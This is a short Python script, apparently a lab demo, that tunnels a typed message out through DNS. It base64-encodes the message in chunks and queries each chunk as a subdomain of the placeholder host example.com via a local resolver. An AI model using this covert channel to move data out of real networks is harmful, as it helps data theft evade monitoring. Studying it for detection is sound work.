#!/usr/bin/env python3

import base64

import dns.message
import dns.query
import dns.resolver

dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
dns.resolver.default_resolver.nameservers = ["127.0.0.1"]

chunk_size = 30


def encode_message(message):
    message_bytes = message.encode()

    encoded_chunks = []
    for i in range(0, len(message_bytes), chunk_size):
        chunk = message_bytes[i: i + chunk_size]
        chunk_encoded = base64.b64encode(chunk).decode()
        encoded_chunks.append(chunk_encoded)

    return encoded_chunks


def send_data(data):
    for chunk in encode_message(data):
        query = f"{chunk}.example.com"
        try:
            dns.resolver.resolve(query, "TXT")
        except dns.resolver.NXDOMAIN:
            pass


if __name__ == "__main__":
    send_data(input("enter your message: "))
